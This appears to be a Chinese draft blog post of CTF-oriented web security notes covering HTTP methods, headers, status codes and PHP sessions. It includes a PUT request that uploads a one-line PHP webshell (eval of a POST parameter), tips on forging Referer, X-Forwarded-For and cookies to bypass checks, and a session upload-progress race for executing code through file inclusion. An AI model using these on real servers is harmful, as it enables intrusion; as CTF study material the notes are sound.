+++
date = '2024-08-29T22:17:02+08:00'
draft = true
title = 'Web安全与渗透测试笔记'
tags = ['ctf', 'web']
categories = ['ctf']
+++

### [@author: lamaper](https://www.cnblogs.com/lamaper)

###  推荐网站

[黑客技术 - 渗透测试 - 吾爱漏洞 (52bug.cn)](http://www.52bug.cn/hkjs)

[CVERC-国家计算机病毒应急处理中心](https://www.cverc.org.cn/)

[国家信息安全漏洞库 (cnnvd.org.cn)](http://www.cnnvd.org.cn/index.html)

[阿里云漏洞库 (aliyun.com)](https://avd.aliyun.com/)

[安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/)

[HackTricks - HackTricks](https://book.hacktricks.xyz/welcome/readme)

[首页 - 『代码审计』知识星球 (govuln.com)](https://govuln.com/)

[首页 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/#)

本笔记目前更适用于CTF，渗透测试的内容正在更新

推荐靶场

[NSSCTF - 主页 (ctfer.vip)](https://www.ctfer.vip/index)

[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/)

https://app.hackthebox.com/

本文遵循CC BY-SA 4.0:要求署名原作者与来源、允许转载或二创、允许商用、要求同协议共享

## 一、基本网络知识

### （一）网络是怎样联通的

- [TCP/IP协议](https://www.51cto.com/article/597961.html)
- [Internet](https://baike.baidu.com/item/因特网/114119?fr=aladdin)
- [Http协议](https://blog.csdn.net/lingxu6/article/details/124738027)

### （二）Http协议

#### http请求

一个完整的Http请求由四个部分组成：

1. 请求行
2. 请求头
3. 空行
4. 请求体

##### 1、请求行

请求行：请求行是由请求方法字段、url字段、http协议版本字段3个部分组成。请求行定义了本次请求的方式，格式如下：`GET/example.html HTTP/1.1(CRLF)`

请求方法有如下几种：

1. GET： 请求获取Request-URI所标识的资源
2. POST： 在Request-URI所标识的资源后增加新的数据
3. HEAD： 请求获取由Request-URI所标识的资源的响应消息报头
4. PUT： 请求服务器存储或修改一个资源，并用Request-URI作为其标识
5. DELETE： 请求服务器删除Request-URI所标识的资源
6. TRACE： 请求服务器回送收到的请求信息，主要用于测试或诊断
7. CONNECT： 保留将来使用
8. OPTIONS： 请求查询服务器的性能，或者查询与资源相关的选项和需求

其中在Web安全中常用的方法为GET和POST，他们通常与编程语言结合，用来传递某些参数，例如在php中：

```
$a = $_GET['a'];
$b = $_POST['b'];
```

就代表通过get请求对变量a进行传值，通过post请求给变量b传值。

GET请求一般写在url中，例如：

```
http://www.example.com/?a=123
```

由`?`引出需要传递的变量，接着对其赋值，若需要多个变量同时赋值，则需要使用`&`，例如：

```
http://www.example.com/?a=123&b=456
```

除此之外，post传递参数写在请求体中，并且省略问号，直接写`a=123`；

另外PUT方法在某些时候可以用于上传恶意代码，这是因为PUT可以直接将请求体中的以文件形式上传，如：

```
PUT example.com/trojan.php HTTP/1.1
Host:................
...........

<?php
 eval($_POST['cmd']);
?>
```

这样trojan.php就会被创建并且会含有请求体里面的内容，如果Trojan已经存在就会被修改。

当然并不是所有服务器都会允许这些请求方法，通常只有GET、POST被允许，如果我们不知道那些方法被允许，可以使用OPTIONS查看相应头中的Allow的值，这里面包含了服务器允许的请求方式。

另外，由于http请求头是以文本形式发送，有些服务器可以接受特殊的自定义方法，如MoeCTF曾要求选手使用不存在的IS方法对服务器进行请求。

##### 2、请求头

请求头：也被称作消息报头,请求头是由一些键值对组成，每行一对，关键字和值用英文冒号`:`分隔。允许客户端向服务器发送一些附加信息或者客户端自身的信息，典型的请求头如下:

> MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。

| Header              | 解释                                                         | 示例                                                         |
| ------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| Accept              | 指定客户端能够接收的内容类型                                 | Accept: text/plain, text/html                                |
| Accept-Charset      | 浏览器可以接受的字符编码集。                                 | Accept-Charset: iso-8859-5                                   |
| Accept-Encoding     | 指定浏览器可以支持的web服务器返回内容压缩编码类型。          | Accept-Encoding: compress, gzip                              |
| Accept-Language     | 浏览器可接受的语言                                           | Accept-Language: en,zh                                       |
| Accept-Ranges       | 可以请求网页实体的一个或者多个子范围字段                     | Accept-Ranges: bytes                                         |
| Authorization       | HTTP授权的授权证书                                           | Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==            |
| Cache-Control       | 指定请求和响应遵循的缓存机制                                 | Cache-Control: no-cache                                      |
| Connection          | 表示是否需要持久连接。（HTTP 1.1默认进行持久连接）           | Connection: close                                            |
| Cookie              | HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 | Cookie: $Version=1; Skin=new;                                |
| Content-Length      | 请求的内容长度                                               | Content-Length: 348                                          |
| Content-Type        | 请求的与实体对应的MIME信息                                   | Content-Type: application/x-www-form-urlencoded              |
| Date                | 请求发送的日期和时间                                         | Date: Tue, 15 Nov 2010 08:12:31 GMT                          |
| Expect              | 请求的特定的服务器行为                                       | Expect: 100-continue                                         |
| From                | 发出请求的用户的Email                                        | From: [user@email.com](mailto:user@email.com)                |
| Host                | 指定请求的服务器的域名和端口号                               | Host: [www.example.com](http://www.cnblogs.com/www.example.com) |
| If-Match            | 只有请求内容与实体相匹配才有效                               | If-Match: “737060cd8c284d8af7ad3082f209582d”                 |
| If-Modified-Since   | 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 | If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT             |
| If-None-Match       | 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 | If-None-Match: “737060cd8c284d8af7ad3082f209582d”            |
| If-Range            | 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag | If-Range: “737060cd8c284d8af7ad3082f209582d”                 |
| If-Unmodified-Since | 只在实体在指定时间之后未被修改才请求成功                     | If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT           |
| Max-Forwards        | 限制信息通过代理和网关传送的时间                             | Max-Forwards: 10                                             |
| Pragma              | 用来包含实现特定的指令                                       | Pragma: no-cache                                             |
| Proxy-Authorization | 连接到代理的授权证书                                         | Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==      |
| Range               | 只请求实体的一部分，指定范围                                 | Range: bytes=500-999                                         |
| Referer             | 先前网页的地址，当前请求网页紧随其后,即来路                  | Referer: http://www.example.com/index.html                   |
| TE                  | 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息     | TE: trailers,deflate;q=0.5                                   |
| Upgrade             | 向服务器指定某种传输协议以便服务器进行转换（如果支持）       | Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11               |
| User-Agent          | User-Agent的内容包含发出请求的用户信息                       | User-Agent: Mozilla/5.0 (Linux; X11)                         |
| Via                 | 通知中间网关或代理服务器地址，通信协议                       | Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)                  |
| Warning             | 关于消息实体的警告信息                                       | Warn: 199 Miscellaneous warning                              |
| X-Forwarded-For     | 用来伪装来源ip                                               | X-Forwarded-For: 127.0.0.1                                   |

在Web安全中我们常用的请求头有`cookie`，`Referer`，`User-Agent`，`X-Forwarded-For`。

cookie是为了保持用户访问网页连贯性而存在的，与其相似的还有session，对于cookie：

> Cookie是一段不超过4KB的小型文本数据，由一个名称（Name）、一个值（Value）和其它几个用于控制Cookie有效期、安全性、使用范围的可选属性组成。其中： (1)Name/Value：设置Cookie的名称及相对应的值，对于认证Cookie，Value值包括Web服务器所提供的访问令牌。 (2)Expires属性：设置Cookie的生存期。有两种存储类型的Cookie：会话性与持久性。Expires属性缺省时，为会话性Cookie，仅保存在客户端内存中，并在用户关闭浏览器时失效；持久性Cookie会保存在用户的硬盘中，直至生存期到或用户直接在网页中单击“注销”等按钮结束会话时才会失效。 (3)Path属性：定义了Web站点上可以访问该Cookie的目录。 (4)Domain属性：指定了可以访问该 Cookie 的 Web 站点或域。Cookie 机制并未遵循严格的同源策略，允许一个子域可以设置或获取其父域的 Cookie。当需要实现单点登录方案时，Cookie 的上述特性非常有用，然而也增加了 Cookie受攻击的危险，比如攻击者可以借此发动会话定置攻击。因而，浏览器禁止在 Domain 属性中设置.org、.com 等通用顶级域名、以及在国家及地区顶级域下注册的二级域名，以减小攻击发生的范围。 (5)Secure属性：指定是否使用HTTPS安全协议发送Cookie。使用HTTPS安全协议，可以保护Cookie在浏览器和Web服务器间的传输过程中不被窃取和篡改。该方法也可用于Web站点的身份鉴别，即在HTTPS的连接建立阶段，浏览器会检查Web网站的SSL证书的有效性。但是基于兼容性的原因（比如有些网站使用自签署的证书）在检测到SSL证书无效时，浏览器并不会立即终止用户的连接请求，而是显示安全风险信息，用户仍可以选择继续访问该站点。由于许多用户缺乏安全意识，因而仍可能连接到Pharming攻击所伪造的网站。 (6)HTTPOnly 属性 ：用于防止客户端脚本通过document.cookie属性访问Cookie，有助于保护Cookie不被跨站脚本攻击窃取或篡改。但是，HTTPOnly的应用仍存在局限性，一些浏览器可以阻止客户端脚本对Cookie的读操作，但允许写操作；此外大多数浏览器仍允许通过XMLHTTP对象读取HTTP响应中的Set-Cookie头。

所以修改本地浏览器cookie可以进行一些操作，绕过某些网站的验证等。

Referer也常用于绕过某些网站的验证，例如某些页面的访问要求必须是从指定的页面跳转，那么修改referer至就可以达到这样的效果。

User-Agent常用于伪装请求者的来源，有些网站电脑版和手机版的操作逻辑不一样或者存在特性，我们在电脑上无法直接访问到手机版网页，这样就可以通过修改UA来进行伪装来源，有一些常见的UA：

```
<----------手机版:------------>
伪装成Opera Mobile:
Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02

伪装成iPhone的Safari：
Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3

伪装成iPhone下的Chrome：
Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; en) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3

伪装成Chrome手机端：
Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B)
AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile
Safari/535.19

<----------电脑版：------------>
谷歌Chrome（Webkit、Blink）
UserAgent：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.138 Safari/537.36

苹果Safair（Webkit、Webkit2）
UserAgent：Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5。

微软IE/Edge（Triden、Blink）
IE11-UserAgent:Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv 11.0) like Gecko
Edge-UserAgent : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36Edge/13.10586

火狐Firefox
User-Agent:Mozilla/5.0 (Windows NT 6.2; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
```

[一些UA的来源于趣事](https://zhuanlan.zhihu.com/p/499478515)

X-Forwarded-For用于修改请求IP，用此可以伪装请求者的来源IP。

##### 3、空行

空行必不可少，它代表着请求头结束，引出请求体

##### 4、请求体

根据请求方式

#### http相应

HTTP响应由三部分组成，状态行、消息报头、响应正文

##### 1、状态行

状态行由三部分组成，HTTP协议的版本号、状态码、以及对状态码的文本描述。如：

```
HTTP/1.1 200 OK (CRLF)
```

> ## 响应状态码
>
> 一般分为五类：
>
> 1. 1xx——信息响应，这一类型的状态码，代表请求已被接受，需要继续处理，这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束，这一类型的状态码，代表请求已被接受，需要继续处理。这类响应是临时响应，只包含状态行和某些可选的响应头信息，并以空行结束。由于HTTP/1.0协议中没有定义任何1xx状态码，所以除非在某些试验条件下，服务器禁止向此类客户端发送1xx响应。这些状态码代表的响应都是信息性的，标示客户应该采取的其他行动。
> 2. 2xx——成功响应，求已成功被服务器接收，理解，并接受，也就是一次成功的响应。
> 3. 3xx——重定向，这类状态码代表需要客户端采取进一步的操作才能完成请求。通常，这些状态码用来重定向，后续的请求地址（重定向目标）在本次响应的Location域中指明。当且仅当后续的请求所使用的方法是GET或者HEAD时，用户浏览器才可以在没有用户介入的情况下自动提交所需要的后续请求。
> 4. 4xx——客户端错误，这类的状态码代表了客户端看起来可能发生了错误，妨碍了服务器的处理。除非响应的是一个HEAD请求，否则服务器就应该返回一个解释当前错误状况的实体，以及这是临时的还是永久性的状况。这些状态码适用于任何请求方法。浏览器应当向用户显示任何包含在此类错误响应中的实体内容。
> 5. 5xx——服务端错误，表示服务器无法完成明显有效的请求。这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。这些状态码适用于任何响应方法。
>
> http状态码可以通过chrome的网络，然后找到all，就可以看到相应接口的状态码。一般200表示成功。
>
> ## 响应状态码具体包括哪些
>
> ### 1xx
>
> - 100
> - - 服务器已经接收到请求头，并且客户端应继续发送请求主体。或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后，向客户端发送一个最终的请求。
> - 101
> - - 服务器已经理解了客户端的请求，并通过升级消息头，通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将切换到在升级消息头中定义的那些协议。
> - 102
> - - 服务器已经收到并正在处理请求，但无响应可用。这样可以防止客户端超时，并假设请求丢失。
>
> ### 2xx
>
> - 200
> - - 请求已经成功，请求希望的响应头或数据体将随之响应返回。实际的响应则取决于你请求的方法，就以GET和POST的请求为例，在GET的请求中，响应将包含与请求的资源相对应的实体。则在POST的请求中，响应将包含描述或操作结果的实体。
> - 201
> - - 请求已经被实现，而且有一个新的资源已经依据请求的需要而创建，并且URI已经随Location头信息返回。
> - 202
> - - 服务器已经接受请求，但是尚未处理，最终该请求也可能不会被执行，并且可能在处理发生时被禁止。
> - 203
> - - 服务器是一个转换代理服务器，例如网络加速器，以200状态码为起源，但回应了原始响应的修改版本。
> - 204
> - - 服务器处理了请求，没有返回内容。。一般适用场景，在wifi设备连接到需要进行Web认证的Wife接入点时，通过访问一个能在HTTP 204响应的网站，如果能正常接受204的响应，则代表无需Web认证，否则会弹出网页浏览器界面，显示出Web网页认证界面用于让用户进行登陆。
> - 205
> - - 服务器成功处理了请求，但没有返回任何内容。与204的区别就是，此响应要求请求者重置文档视图。
> - 206
> - - 服务器已经成功处理了部分GET请求。典型的应用就是像迅雷这类的HTTP下载工具响应实现端点续传或者将一个大文档分解为多个下载段同时下载。
> - 207
> - - 代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。
> - 208
> - - DAV绑定的成员已经在（多状态）响应之前的部分被列举，且未被再次包含。
> - 226
> - - 服务器已经满足了对资源的请求，对实体请求的一个或多个实体操作的结果表示。
>
> ### 3xx
>
> - 300
> - - 被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。除非这是一个HEAD请求，否则该响应应当包括一个资源特性及地址的列表的实体，以便用户或浏览器从中选择最合适的重定向地址。这个实体的格式由Content-Type定义的格式所决定。浏览器可能根据响应的格式以及浏览器自身能力，自动作出最合适的选择。
> - Content-Type 标头告诉客户端实际返回的内容的内容类型。一般在http的请求头进行设置。一般有以下的几种格式：
> - - text/html: HTML 格式
>   - text/plain: 纯文本格式
>   - text/xml: XML 格式
>   - image/gif: gif图片格式
>   - image/jpeg: jpg图片格式
>   - image/png: png图片格式
> - 301
> - - 被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个URI之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。
> - 302
> - - 要求客户端执行临时重定向,由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求，只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。Cache-Control是http响应头用来放置缓存信息的。
> - 303
> - - 对应当前请求的响应可以在另一个URI上被找到，当响应于POST（或PUT / DELETE）接收到响应时，客户端应该假定服务器已经收到数据，并且应该使用单独的GET消息发出重定向。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。这个新的URI不是原始资源的替代引用。同时，303响应禁止被缓存。当然，第二个请求（重定向）可能被缓存。
> - 304
> - - 表示资源在由请求头中的if-Modified-Since 或 if-None-Match 参数指定的这一版本之后，未曾被修改。由于客户端仍然具有以前下载的副本，因此不需要重新传输资源。
> - 305
> - - 被请求的资源必须通过指定的代理才能被访问。Location域中将给出指定的代理所在的URI信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能创建305响应。
> - 306
> - - 在最新版的规范中，306状态码已经不再被使用。最初是指“后续请求应使用指定的代理”。
> - 307
> - - 在这种情况下，请求应该与另一个URI重复，但后续的请求应仍使用原始的URI,与302相反，当重新发出原始请求时，不允许更改请求方法。 例如，应该使用另一个POST请求来重复POST请求。
> - 308
> - - 请求和所有将来的请求应该使用另一个URI重复。 307和308重复302和301的行为，但不允许HTTP方法更改。 例如，将表单提交给永久重定向的资源可能会顺利进行。
>
> ### 4xx
>
> - 400
> - - 由于明显的客户端错误（例如，格式错误的请求语法，太大的大小，无效的请求消息或欺骗性路由请求），服务器不能或不会处理该请求。
> - 401
> - - 类似于403 Forbidden，401语义即"未认证"，即用户没有必要的凭据。该状态码表示当前需求需要用户验证。
> - 402
> - - 该状态码是为了将来可能的需求而预留的。该状态码最初的意图可能被用作某种形式的数字现金或在线支付方案的一部分，但几乎没有哪家服务商使用，而且这个状态码通常不被使用。
> - 403
> - - 服务器已经理解请求，但是拒绝执行它。与401响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个HEAD请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个404响应，假如它不希望让客户端获得任何信息。
> - 404
> - - 请求失败，请求所希望得到的资源未被在服务器上发现，但允许用户的后续请求。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用404状态码来告知旧资源因为某些内部的配置机制问题已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况。
> - 405
> - - 请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow头信息用以表示出当前资源能够接受的请求方法的列表。例如，需要通过POST呈现数据的表单上的GET请求，或只读资源上的PUT请求。鉴于PUT，DELETE方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认的配置下不允许上述的请求方法，对于此类请求均会返回405错误。
> - 406
> - - 请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体，该请求不可接受。除非这是一个HEAD请求，否则该响应就应当返回一个包含可以让用户或者浏览器从中选择最合适的实体特性以及地址栏表的实体。实体的格式由Content-Type头中定义的媒体类型决定。浏览器可以根据格式及自身能力自行作出最佳选择。但是，规范中并没有定义任何作出此类自动选择的标准。
> - 407
> - - 与401的响应类似，不同的是客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个Proxy-Authenticate用以进行身份询问。客户端可以返回一个Proxy-Authorization信息头用以验证。
> - 408
> - - 请求超时。根据HTTP规范，客户端没有在服务器预备等待的时间内完成一个请求的发送，客户端可以随时再次提交这一请求而无需进行任何更改。
> - 409
> - - 表示因为请求存在冲突无法处理该请求，例如多个同步更新之间的编辑冲突。
> - 410
> - - 表示所请求的资源不再可用，将不再可用。当资源被有意地删除并且资源应被清除时，应该使用这个。在收到410状态码后，用户应停止再次请求资源。但大多数服务端不会使用此状态码，而是直接使用404状态码。
> - 411
> - - 服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效Content-Length头之后，客户端可以再次提交该请求。
> - 412
> - - 服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。
> - 413
> - - 表示服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。如果这个状况是临时的，服务器应当返回一个Retry-After的响应头，以告知客户端可以在多少时间以后重新尝试。
> - 414
> - - 表示请求的URI长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。通常将太多数据的结果编码为GET请求的查询字符串，在这种情况下，应将其转换为POST请求。
> - 通常的情况包括：
> - - 本应使用POST方法的表单提交变成了GET方法，导致查询字符串过长；
>   - 重定向URI“黑洞”，例如每次重定向把旧的URI作为新的URI的一部分，导致在若干次重定向后URI超长。
>   - 客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器，这类服务器使用固定长度的缓冲读取或操作请求的URI，当GET后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行，没有此类漏洞的服务器，应当返回414状态码。
> - 415
> - - 对于当前请求的方法和所请求的资源，请求中提交的互联网媒体类型并不是服务器中所支持的格式，因此请求被拒绝。例如。客户端将图像的格式上传为svg,但服务器要求图像使用上传格式为jpg。
> - 416
> - - 客户端已经要求文件的一部分，但服务器不能提供该部分。例如，如果客户端要求文件的一部分超出文件尾端。
> - 417
> - - 在请求头Expect中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服显的证据证明在当前路由的下一个节点上，Expect的内容无法被满足。
> - 421
> - - 该请求针对的是无法产生响应的服务器（例如因为连接重用）。
> - 422
> - - 请求格式正确，但是由于含有语义错误，无法响应。
> - 423
> - - 当前的资源被锁定。
> - 424
> - - 由于之前的某个请求发生错误，导致当前的请求失败。
> - 425
> - - 服务器拒绝处理在Early Data中的请求，以规避可能的重放攻击。
> - 重放攻击是一种网络攻击，通过恶意的欺诈性地重复或拖延正常的数据传输而实施。因工作原理如同重放歌曲一样而得名。
> - 426
> - - 原服务器要求该请求满足一定条件。这是为了防止“未更新”问题，即客户端读取（GET）一个资源的状态，更改它，并将它写（PUT）回服务器，但这期间第三方已经在服务器上更改了该资源的状态，因此导致了冲突。
> - 429
> - - 用户在给定的时间内发送了太多的请求。旨在用于网络限速。
> - 431
> - - 服务器不愿处理请求，因为一个或多个头字段过大。
> - 451
> - - 该访问因法律的要求而被拒绝。
>
> ### 5xx
>
> - 500
> - - 通用错误消息，服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。没有给出具体错误信息。
> - 501
> - - 服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。
> - 502
> - - 作为网关或者代理工作服务器尝试执行请求时，从上游服务器收到无效的响应。
> - 503
> - - 由于临时的服务器维护或者过载，服务器无法处理请求。这个状况时暂时的，且在一段时间后就会恢复。
> - 504
> - - 作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP,FTP,LDAP)或者辅助服务器(例如DNS)收到的响应。
> - 505
> - - 服务器不支持，或者拒绝支持在请求中使用的HTTP版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。
> - 506
> - - 代表服务器存在内部配置错误，被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。
> - 507
> - - 服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。
> - 508
> - - 服务器在处理请求时陷入死循环。
> - 511
> - - 客户端需要进行身份验证才能获得网络访问权限，旨在限制用户群访问特定网络。

#### 会话（Session）

> Session：在计算机中，尤其是在网络应用中，称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。

由于html的特性，多个请求之间无关联，如果在/xxx.html中为登录状态，那么跳转到/yyy.html就会变成默认的未登录状态，seesion的出现是为了弥补这一缺陷，让每一个用户在多个请求中状态一致。

session是保存在服务端的，与之相对的是cookie，cookie是保存在客户端的。每当用户使用一浏览器开始对服务器发出请求，一个session就会被创建，当用户关闭浏览器结束访问，session会被删除。所以用同一个ip访问同一个网站，如果浏览器不同，用户状态也是不同的，所以session创建的标准是浏览器而不是ip。session不随刷新页面而消失。

特别要注意的是，Session是一种技术，一种形式，并不是某种特殊的文件格式或其他的，在下文中为了区别一些Session的具体实现：如session、sessionstorage、localstorage还有redis，我将首字母大写的Session代指这项保持用户会话的技术，小写来代指具体的实现方式。

##### 1、php中的session

每次我们访问一个页面，如果有开启session，也就是有session_start() 时，就会自动生成一个session_id 来标注是这次会话的唯一ID，同时也会自动往cookie里写入一个名字为PHPSESSID的变量，它的值正是session_id，当这次会话没结束，再次访问的时候，服务器会去读取这个PHPSESSID的cookie是否有值有没过期，如果能够读取到，则继续用这个session_id，如果没有，就会新生成一个session_id，同时生成PHPSESSID这个cookie。由于默认生成的这个PHPSESSID cookie是会话，也就是说关闭浏览器就会过期掉，所以，下次重新浏览时，会重新生成一个session_id。

这个session是32位的。

session的存储地址在`php.ini`文件中会被标明，一般最后一级目录会是`\tmp`，当一个会话开始的时候，服务器会在目录下写入`sess_xxxxxxxxxx`文件，下划线后的就是这个会话的session_id。

**一些session的服务端操作**

一般我们通过`$_SESSION['<变量名>'] = ....`将一些数据存储在session中。这些数据最终会被以序列化后的格式存储在sess_文件中。session.save_handler = files 表示的是session的存储方式，默认的是files文件的方式保存。

**一些常用的函数与参数**

`save_handler`不仅仅只能用文件files，还可以用我们常见的memcache 和 redis 来保存。

`session.use_cookies` 默认是1，表示会在浏览器里创建值为PHPSESSID的session_id，session.name = PHPSESSID 找个配置就是改这个名字的，这个名称可以进行修改，如修改成PhPP，就会在浏览器cookie中创建PhPP的sessionid。

`session.auto_start = 0`用来是否需要自动开启session，默认是不开启的，所有我们需要在代码中用到session_start()；函数开启，如果设置成1，那么session_id 也会自动就生成了。

`session.cookie_lifetime = 0`这个是设置在客户端生成PHPSESSID这个cookie的过期时间，默认是0，也就是关闭浏览器就过期，下次访问，会再次生成一个session_id。所以，如果想关闭浏览器会话后，希望session信息能够保持的时间长一点，可以把这个值设置大一点，单位是秒。

`gc_divisor`, `gc_probability`, `gc_maxlifetime`是回收这些sess_xxxxx 的文件，它是按照这3个参数，组成的比率，来启动GC删除这些过期的sess文件。gc_maxlifetime是sess_xxx文件的过期时间。

 

##### 2、sessionstorage和localstorage

它们来自于**Web Storage API** ，这是一种新的机制， 使浏览器能以一种比使用 Cookie 更直观的方式存储键/值对。

Web Storage 包含如下两种机制：

- `sessionStorage` 为每一个给定的源（given origin）维持一个独立的存储区域，该存储区域在页面会话期间可用（即只要浏览器处于打开状态，包括页面重新加载和恢复）。
- `localStorage` 同样的功能，但是在浏览器关闭，然后重新打开后数据仍然存在。

这两种机制是通过 Window.sessionStorage和 `Window.localStorage`属性使用（更确切的说，在支持的浏览器中 `Window`对象实现了 `WindowLocalStorage` 和 `WindowSessionStorage` 对象并挂在其 `localStorage` 和 `sessionStorage` 属性下）—— 调用其中任一对象会创建`Storage`对象，通过`Storage` 对象，可以设置、获取和移除数据项。对于每个源（origin）`sessionStorage` 和 `localStorage` 使用不同的 `Storage` 对象——独立运行和控制。

 

##### [技巧]3、session竞争

由于session的特性，导致流量大的服务器将会承受很大的session存储压力，所有会定义一个定时清除session的程序，当我们的恶意程序包含在session中时，也可能被服务端识别并删除，这时候我们可以通过暴力手段不停上传session文件一起到在服务端删除本地session后仍然有新的session存在。

###### session恶意代码

在`phpinfo()`中存在这些数据

```
1,session.save_handler  files   files
    表示session以文件的形式存储。
2,session.save_path /tmp    /tmp
    表示session存储目录在/tmp下。
3,session.serialize_handler php php
    表示反序列化和序列号的处理器是PHP。
4,session.upload_progress.cleanup   On  On
    表示文件上传结束后，php会立即清除对应session文件中的内容。
5,session.upload_progress.enabled   On  On
    表示upload_progress功能启动，即浏览器向服务器上传文件时，php会把此次文件上传的详细信息存储在session中。
6,session.upload_progress.freq  1%  1%
7,session.upload_progress.min_freq  1   1
    freq 和 min_freq 两项用来设置服务器端对进度信息的更新频率。合理的设置这两项可以减轻服务器的负担。
8,session.upload_progress.name  PHP_SESSION_UPLOAD_PROGRESS PHP_SESSION_UPLOAD_PROGRESS
9,session.upload_progress.prefix    upload_progress_    upload_progress_
    prefix 和 name 两项用来设置进度信息在session中存储的变量名/键名
10,session.use_cookies  On  On
    表示使用cookie记录sessionid。
11,session.use_only_cookies On  On
    表示是否在客户端仅仅使用 cookie 来存放会话 ID。
12,session.use_strict_mode  Off Off
    值为off，表示Cookie中的sessionid可控。
```

一般来说PHP_SESSION_UPLOAD_PROGRESS是开的，所以我们一般会往这个键值中写入恶意代码，然后让整个sess文件被文件包含后解析代码，最终执行代码。

以[ NSSCTF - 第五空间 2021\EasyCleanup (ctfer.vip)](https://www.ctfer.vip/problem/336)为例

服务端代码出现

```
if(isset($_GET['file'])){ 
    if(strlen($_GET['file']) > 15 | filter($_GET['file'])) exit("hacker"); 
    include $_GET['file']; 
} 
```

